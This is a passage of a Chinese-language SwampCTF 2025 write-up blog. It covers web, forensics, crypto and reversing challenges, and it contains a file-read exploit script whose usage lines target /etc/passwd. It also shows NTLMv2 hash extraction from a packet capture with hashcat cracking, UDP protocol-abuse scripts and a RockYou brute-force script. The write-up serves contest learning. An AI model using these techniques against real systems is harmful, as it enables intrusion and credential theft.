</span><br><span class="line">        <span class="comment"># 步骤2: 获取包含flag的Person对象列表</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"[*] 获取Person对象列表..."</span>)</span><br><span class="line">        response = requests.get(<span class="string">f"<span class="subst">{TARGET_URL}</span>/api/person"</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> response.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"[!] 获取失败: <span class="subst">{response.status_code}</span>"</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 解析结果</span></span><br><span class="line">        persons = response.json()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> persons:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"[!] 没有找到任何Person对象"</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 查找最后创建的Person对象并提取flag</span></span><br><span class="line">        latest_person = persons[-<span class="number">1</span>]  <span class="comment"># 假设最后一个就是我们刚创建的</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="string">"job"</span> <span class="keyword">in</span> latest_person <span class="keyword">and</span> <span class="string">"resume"</span> <span class="keyword">in</span> latest_person[<span class="string">"job"</span>]:</span><br><span class="line">            flag_content = latest_person[<span class="string">"job"</span>][<span class="string">"resume"</span>]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"\n[+] 找到文件内容:"</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"-"</span> * <span class="number">40</span>)</span><br><span class="line">            <span class="built_in">print</span>(flag_content)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"-"</span> * <span class="number">40</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"[!] Person对象中没有包含文件内容"</span>)</span><br><span class="line">            <span class="built_in">print</span>(json.dumps(latest_person, indent=<span class="number">2</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"[!] 发生错误: <span class="subst">{<span class="built_in">str</span>(e)}</span>"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># 从命令行参数获取目标文件路径，默认为/flag</span></span><br><span class="line">    target_file = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="string">"/flag"</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 从命令行参数获取目标URL，默认为上面定义的</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">2</span>:</span><br><span class="line">        TARGET_URL = sys.argv[<span class="number">2</span>]</span><br><span class="line">    </span><br><span class="line">    exploit(target_file)</span><br></pre></td></tr></tbody></table></figure>

<p>使用方法:</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基本用法 (读取/flag.txt文件)</span></span><br><span class="line">python3 exploit.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定目标文件</span></span><br><span class="line">python3 exploit.py /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定文件和URL</span></span><br><span class="line">python3 exploit.py /flag.txt http://challenge.example.com:9090</span><br></pre></td></tr></tbody></table></figure>



<hr>
<h2 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h2><h3 id="Homeword-Help"><a href="#Homeword-Help" class="headerlink" title="Homeword Help"></a>Homeword Help</h3><blockquote>
<p>I accidently lost some of my class notes! Can you help me recover it? (Note: Unzipped size is 4GB)</p>
</blockquote>
<p>FTK挂载，发现一个word文档</p>
<p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331202919249.png" alt="img"></p>
<p>打开文档，发现flag</p>
<p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331202931787.png" alt="img"></p>
<blockquote>
<p>swampCTF{n0thing_i5_3v3r_d3l3t3d}</p>
</blockquote>
<h3 id="Preferential-Treatment"><a href="#Preferential-Treatment" class="headerlink" title="Preferential Treatment"></a>Preferential Treatment</h3><blockquote>
<p>We have an old Windows Server 2008 instance that we lost the password for. Can you see if you can find one in this packet capture?</p>
</blockquote>
<p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331202954022.png" alt="img"></p>
<p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203015942.png" alt="img"></p>
<p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203025504.png" alt="img"></p>
<blockquote>
<p>swampCTF{4v3r463_w1nd0w5_53cur17y}</p>
</blockquote>
<h3 id="Planetary-Storage"><a href="#Planetary-Storage" class="headerlink" title="Planetary Storage"></a>Planetary Storage</h3><blockquote>
<p>My friend found this strange file while perusing his computer, but we can’t read it. Can you figure out what it is and get the information from it?</p>
<p>Difficulty: Easy/Medium</p>
<p>The flag is in the standard format.</p>
</blockquote>
<p>附件给了ldb文件</p>
<p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203035428.png" alt="image-20250331194336056"></p>
<p>用LevelDBDumper解ldb包</p>
<p><code>.\LevelDBDumper.exe -d "D:\ctf\SwampCTF2025\Forensics\PlanetaryStorage\challenge" -o "D:\ctf\SwampCTF2025\Forensics\PlanetaryStorage\output" -f "db.txt" -t "csv" -q</code></p>
<ul>
<li><code>-d</code> 或 <code>--dir</code>：指定包含 <code>.ldb</code> 文件的目录。这是必需的参数。</li>
<li><code>-o</code> 或 <code>--outputDir</code>：指定输出文件的目录。</li>
<li><code>-f</code> 或 <code>--outputFile</code>：指定输出文件的文件名。</li>
<li><code>-t</code> 或 <code>--outputType</code>：指定输出格式，可以是 <code>csv</code> 或 <code>json</code>。</li>
<li><code>-q</code> 或 <code>--quiet</code>：静默模式，不将键值对输出到控制台。</li>
<li><code>-b</code> 或 <code>--batch</code>：将所有输出文件合并为一个文件。</li>
<li><code>-c</code> 或 <code>--clean-output</code>：清理输出文件中的非可视字符。</li>
<li><code>-z</code> 或 <code>--timezone</code>：指定时区，默认为 UTC。</li>
</ul>
<p>提取到内容：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Key,Value</span><br><span class="line">/_localHeads,"[{""payload"":""eyJrZXkiOiJcIjMzNTc5M2Q1LTRhYzEtNDgyMy05MmM3LWZkM2I1YTZhMmEwN1wiIiwib3AiOiJQVVQiLCJ2YWx1ZSI6ImV5SmtZWFJoSWpwYkluTjNZVzF3UTFSR2V6RndaalV0WWpRMU0yUXRaRFEzTkdJME5UTjlJbDBzSW1sa0lqb2lYQ0l6TXpVM09UTmtOUzAwWVdNeExUUTRNak10T1RKak55MW1aRE5pTldFMllUSmhNRGRjSWlKOSJ9"",""id"":""/orbitdb/bafyreiejrtaennxufa3wvkdvyoj6ywq6nid3lukdqcnx2fc33tckzjzbke/ctf"",""next"":[{""/"":""bafyreibbadm2ajrr6io6ufqidibrpdjfpdyfobp2aqvmcprqu5yrk7mq6q""}],""refs"":[{""/"":""bafyreiesvykh6wt7hn4fry4mphv6ckxr5wq3c2fecvcjbqs4scbkizc6jm""},{""/"":""bafyreihq7osywkglsjxn5lmbegtc7izqmb66atx5trkrpcmlvtcyrr6nuy""},{""/"":""bafyreiab6do7qxgjipiypoj754vicpuscejf43eguvo2ykb2igoyrtkl64""}],""v"":2,""key"":""BJx/DXfZOVG6YkoHDGQvNQVMBaoeaEdEvcKFJP0PM1m3h9/o8lJgnTQkqGCAKovuOCovsDHQ5JOVs7qpJm3V8Ks="",""sig"":""MEQCIF5FwOBiQKgEI7njg6He6iAlwNc+Gj8+PAll5o1PCGhKAiBlnXg9+hinX6AGB2r0uXoJ3q9Tbe6azh9euPx40G8uqw=="",""identity"":{""id"":""02020192715ea41d7eaaceb4bd19516d0d4f1e8a2e81903480083dbdbe99dfefc9"",""publicKey"":""BJx/DXfZOVG6YkoHDGQvNQVMBaoeaEdEvcKFJP0PM1m3h9/o8lJgnTQkqGCAKovuOCovsDHQ5JOVs7qpJm3V8Ks="",""signatures"":{""id"":""MEQCIGx+GRqmTfPqcUL28aG2p1Q2TNEfZ9QlCgB8WU4my68UAiBZClP9WMe385COJ0WuNnXRj7BIolRC2v6vhLqUt3Yk/w=="",""publicKey"":""MEQCIFC+7AikjMLabNvdHiHh7rwrFTbystu6xc2r1h/1Zr4jAiBFxjxIMNjfI5J996HDYEQd+fnaKDi5GlNw5hgl+RwEOg==""},""type"":""orbitdb"",""Provider"":null},""hash"":{""/"":""bafyreihq6d33ifjj6jbmjptygyksgwzcrjm5kxarbbp6djbzqx2exij27u""},""clock"":{""id"":""BJx/DXfZOVG6YkoHDGQvNQVMBaoeaEdEvcKFJP0PM1m3h9/o8lJgnTQkqGCAKovuOCovsDHQ5JOVs7qpJm3V8Ks="",""time"":7}}]"</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p>payload部分base64解码</p>
<p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203043893.png" alt="image-20250331194455003"></p>
<p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331204903897.png" alt="image-20250331194532775"></p>
<blockquote>
<p>swampCTF{1pf5-b453d-d474b453}</p>
</blockquote>
<h3 id="MuddyWater"><a href="#MuddyWater" class="headerlink" title="MuddyWater"></a>MuddyWater</h3><blockquote>
<p>We caught a threat actor, called MuddyWater, bruteforcing a login for our Domain Controller. We have a packet capture of the intrustion. Can you figure out which account they logged in to and what the password is?</p>
<p>Flag format is <code>swampCTF{&lt;username&gt;:&lt;password&gt;}</code></p>
</blockquote>
<p>筛选SMB2，找到验证通过时的数据包</p>
<p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203123107.png" alt="img"></p>
<p>寻找报文的上下关系</p>
<p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203148208.png" alt="img"></p>
<p>ntlmssp_auto下找到NTProofstr和NTLMv2 Response(NTLMv2 Response开头包含了NTProofstr的值，需要去掉)</p>
<p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203157043.png" alt="img"></p>
<p>同时找到domain和user name</p>
<p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203218606.png" alt="img"></p>
<p>ntlmssp_challenge下找到NTLM Server Challenge的值</p>
<p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203232597.png" alt="img"></p>
<blockquote>
<p>username::domain:ntlmv2_response.chall:ntproofstr:不包含ntproofstr的ntlmv2_response值</p>
</blockquote>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">### smb2.txt</span><br><span class="line">hackbackzip::DESKTOP-0TNOE4V:d102444d56e078f4:eb1b0afc1eef819c1dccd514c9623201:01010000000000006f233d3d9f9edb01755959535466696d0000000002001e004400450053004b0054004f0050002d00300054004e004f0045003400560001001e004400450053004b0054004f0050002d00300054004e004f0045003400560004001e004400450053004b0054004f0050002d00300054004e004f0045003400560003001e004400450053004b0054004f0050002d00300054004e004f00450034005600070008006f233d3d9f9edb010900280063006900660073002f004400450053004b0054004f0050002d00300054004e004f004500340056000000000000000000</span><br></pre></td></tr></tbody></table></figure>

<p>hashcat爆破</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> 34405@Warmlight D:\....\hashcat-6.2.6  .\hashcat.exe -m 5600 .\smb2.txt .\passphrases.txt --show</span><br><span class="line">HACKBACKZIP::DESKTOP-0TNOE4V:d102444d56e078f4:eb1b0afc1eef819c1dccd514c9623201:01010000000000006f233d3d9f9edb01755959535466696d0000000002001e004400450053004b0054004f0050002d00300054004e004f0045003400560001001e004400450053004b0054004f0050002d00300054004e004f0045003400560004001e004400450053004b0054004f0050002d00300054004e004f0045003400560003001e004400450053004b0054004f0050002d00300054004e004f00450034005600070008006f233d3d9f9edb010900280063006900660073002f004400450053004b0054004f0050002d00300054004e004f004500340056000000000000000000:pikeplace</span><br><span class="line"> 34405@Warmlight D:\....\hashcat-6.2.6 </span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203330773.png" alt="img"></p>
<h3 id="Proto-Proto"><a href="#Proto-Proto" class="headerlink" title="Proto Proto"></a>Proto Proto</h3><blockquote>
<p>Moto Moto likes you. But not enough to explain how his server works. We got a pcap of the client and server communicating. Can you figure out how the server works and retrieve the flag?</p>
<p>chals.swampctf.com:44254</p>
</blockquote>
<p>给的url无法访问</p>
<p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203326822.png" alt="image-20250331115508754"></p>
<p>筛选UDP流量，发现flag字符（假的）</p>
<p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203337773.png" alt="image-20250331115841058"></p>
<p>追踪UDP流，通信过程未进行加密，客户端先请求读取flag，然后服务端进行数据响应，我们可通过UDP服务请求先服务端来读取flag</p>
<p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203342673.png" alt="image-20250331114442536"></p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置服务器地址和端口</span></span><br><span class="line">server = <span class="string">"chals.swampctf.com"</span></span><br><span class="line">port = <span class="number">44254</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义负载</span></span><br><span class="line">payload = <span class="string">b"\x02\x08\x66\x6c\x61\x67\x2e\x74\x78\x74"</span>  <span class="comment">#"flag.txt"的二进制编码</span></span><br><span class="line"><span class="comment"># \x02表示命令</span></span><br><span class="line"><span class="comment"># \x08表示filename的长度len(flag.txt)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建UDP套接字</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"><span class="comment"># socket.AF_INET：指定使用IPv4地址族。</span></span><br><span class="line"><span class="comment"># socket.SOCK_DGRAM：指定使用UDP协议。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送负载到服务器</span></span><br><span class="line">s.sendto(payload, (server, port))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 接收服务器的响应</span></span><br><span class="line">response, addr = s.recvfrom(<span class="number">4096</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 打印响应</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"HEX response:"</span>, response.<span class="built_in">hex</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Decoded response:"</span>, response.decode(errors=<span class="string">'ignore'</span>))</span><br><span class="line"></span><br><span class="line">s.close()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203346185.png" alt="image-20250331111832079"></p>
<blockquote>
<p>swampCTF{r3v3r53_my_pr070_l1k3_m070_m070}</p>
</blockquote>
<h3 id="Proto-Proto-2"><a href="#Proto-Proto-2" class="headerlink" title="Proto Proto 2"></a>Proto Proto 2</h3><blockquote>
<p>Moto Moto heard you were able to reverse his server code, so he set up some “encryption”. Can you figure out the key and retrieve the flag?</p>
<p>chals.swampctf.com:44255</p>
</blockquote>
<p>跟上一题一样的思路，首先筛选UDP流并追踪</p>
<p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203351872.png" alt="image-20250331155544413"></p>
<p>可以看到客户端请求内容为：<code>super_secret_password.flag.txt</code>,这里查看flag文件需要传入一个password，</p>
<p>分析报文格式</p>
<p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203356074.png" alt="image-20250331155731140"></p>
<p>传输的数据格式如下：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">b""</span></span><br><span class="line">payload  = <span class="string">b"\x02"</span></span><br><span class="line">payload += <span class="built_in">len</span>(key).to_bytes(<span class="number">1</span>, byteorder=<span class="string">'big'</span>) </span><br><span class="line">payload += key</span><br><span class="line">payload += <span class="built_in">len</span>(<span class="string">b"flag.txt"</span>).to_bytes(<span class="number">1</span>, byteorder=<span class="string">'big'</span>)</span><br><span class="line">payload += <span class="string">b"flag.txt"</span></span><br></pre></td></tr></tbody></table></figure>

<p>根据题目信息，key设置为<code>encryption</code>，输出了flag的尾部</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HEX response: 077f4666705641454e785c3037305f6d3037305f35384832425e32635732045f345f6e305f6e307d0a</span><br><span class="line">Decoded response: FfpVAENx\070_m070_58H2B^2cW2_4_n0_n0}</span><br></pre></td></tr></tbody></table></figure>

<p>key为<code>swampCTF{y0u_kn0w_b3773r_7h4n_7h47}</code>时，输出</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HEX response: 07695f646f5f7265616c4b652c0c467a70340652686a11624278757f0a33350d32082b345c6d387f14</span><br><span class="line">Decoded response: i_do_realKe,</span><br><span class="line">Fzp4RhjbBxu</span><br><span class="line">+4\m8</span><br></pre></td></tr></tbody></table></figure>

<p>注意到<code>i_do_real</code>部分</p>
<p>再将<code>i_do_real</code>作为key输入为</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HEX response: 077377616d704354467b5b0a3d3c7266252235590439490e4242237b57020e55054e7928437306760b</span><br><span class="line">Decoded response: swampCTF{[</span><br><span class="line">=&lt;rf%"5Y9IBB#{WUNy(Csv</span><br></pre></td></tr></tbody></table></figure>

<p>此时看到了flag的头部，大致可以猜测这是一个对称加密，加密秘钥为<code>i_do_real_encryption</code></p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">key = <span class="string">b"i_do_real_encryption"</span></span><br><span class="line"><span class="comment"># 定义负载</span></span><br><span class="line">payload  = <span class="string">b"\x02"</span> </span><br><span class="line">payload += <span class="built_in">len</span>(key).to_bytes(<span class="number">1</span>, byteorder=<span class="string">'big'</span>)</span><br><span class="line">payload += key</span><br><span class="line">payload += <span class="string">b"\x08\x66\x6c\x61\x67\x2e\x74\x78\x74"</span></span><br><span class="line"></span><br><span class="line">server = <span class="string">'chals.swampctf.com'</span></span><br><span class="line">port = <span class="number">44255</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建UDP套接字</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"><span class="comment"># socket.AF_INET：指定使用IPv4地址族。</span></span><br><span class="line"><span class="comment"># socket.SOCK_DGRAM：指定使用UDP协议。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送负载到服务器</span></span><br><span class="line">s.sendto(payload, (server, port))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 接收服务器的响应</span></span><br><span class="line">response, addr = s.recvfrom(<span class="number">4096</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 打印响应</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"HEX response:"</span>, response.<span class="built_in">hex</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Decoded response:"</span>, response.decode(errors=<span class="string">'ignore'</span>))</span><br><span class="line"></span><br><span class="line">s.close()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>

<blockquote>
<p>swampCTF{m070_m070_54y5_x0r_15_4_n0_n0}</p>
</blockquote>
<hr>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Rock-my-Password"><a href="#Rock-my-Password" class="headerlink" title="Rock my Password"></a>Rock my Password</h3><blockquote>
<h4 id="Rock-my-Password—150"><a href="#Rock-my-Password—150" class="headerlink" title="Rock my Password—150"></a>Rock my Password—150</h4><p>I’ve come up with an extremely secure(tm) way to store my password, noone will be able to reverse it! I’ve hashed it with md5 100 times, then sha256 100 times, then sha512 100 times! There’s no way you’re going to be able to undo it &gt;:3 I’ll even tell you it was in the RockYou database, and the password is 10 characters long, that’s how confident I am!</p>
<p>The flag is in the format: swampCTF{RockYouPassword}</p>
<p>As a reminder, please don’t flood our infrastructure with guesses.</p>
<p>Hashed Password (Flag): f600d59a5cdd245a45297079299f2fcd811a8c5461d979f09b73d21b11fbb4f899389e588745c6a9af13749eebbdc2e72336cc57ccf90953e6f9096996a58dcc</p>
<p>Note: The entire flag (swampCTF{rockyoupassword}) was hashed to get the provided hash, not just rockyoupassword</p>
</blockquote>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">apply_hash_n_times</span>(<span class="params">data, hash_func, n</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        data = hash_func(data).digest()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    target_hash = <span class="string">"f600d59a5cdd245a45297079299f2fcd811a8c5461d979f09b73d21b11fbb4f899389e588745c6a9af13749eebbdc2e72336cc57ccf90953e6f9096996a58dcc"</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Assuming rockyou.txt is in the same directory</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'rockyou.txt'</span>, <span class="string">'r'</span>, encoding=<span class="string">'latin-1'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            password = line.strip()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(password) == <span class="number">10</span>:</span><br><span class="line">                flag = <span class="string">f"swampCTF{{<span class="subst">{password}</span>}}"</span>.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># MD5 100 times</span></span><br><span class="line">                md5_hash = flag</span><br><span class="line">                <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">                    md5_hash = hashlib.md5(md5_hash).digest()</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># SHA256 100 times</span></span><br><span class="line">                sha256_hash = md5_hash</span><br><span class="line">                <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">                    sha256_hash = hashlib.sha256(sha256_hash).digest()</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># SHA512 100 times</span></span><br><span class="line">                sha512_hash = sha256_hash</span><br><span class="line">                <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">                    sha512_hash = hashlib.sha512(sha512_hash).digest()</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># Compare</span></span><br><span class="line">                <span class="keyword">if</span> sha512_hash.<span class="built_in">hex</span>() == target_hash:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f"Found password: <span class="subst">{password}</span>"</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f"Flag: swampCTF{{<span class="subst">{password}</span>}}"</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"Password not found in rockyou.txt"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure>

<blockquote>
<p>swampCTF{secretcode}</p>
</blockquote>
<hr>
<h2 id="rev"><a href="#rev" class="headerlink" title="rev"></a>rev</h2><h3 id="You-Shall-Not-Passss"><a href="#You-Shall-Not-Passss" class="headerlink" title="You Shall Not Passss"></a>You Shall Not Passss</h3><p>main()函数，前面都是在写字符串，动调直接跳过去，从sub_580F548E67E0()进去</p>
<p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203412209.png" alt="img"></p>
<p>sub_580F548E67E0()</p>
<p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203445585.png" alt="img"></p>
<p>动调之后，中间数据都转换成代码</p>
<p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203415144.png" alt="img"></p>
<p>转换过后可以看到加密验证的逻辑</p>
<p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203419731.png" alt="img"></p>
<p>解密脚本</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_data</span>(<span class="params">cipher, a</span>):</span><br><span class="line"></span><br><span class="line">    flag = []</span><br><span class="line">    tmp = a</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> cipher:</span><br><span class="line">        <span class="comment"># 计算当前的伪随机数</span></span><br><span class="line">        tmp = (<span class="number">330</span> * tmp + <span class="number">100</span>) % <span class="number">0x8FF</span></span><br><span class="line">        <span class="comment"># 恢复原始数据</span></span><br><span class="line">        original_byte = byte ^ (tmp &amp; <span class="number">0xFF</span>)</span><br><span class="line">        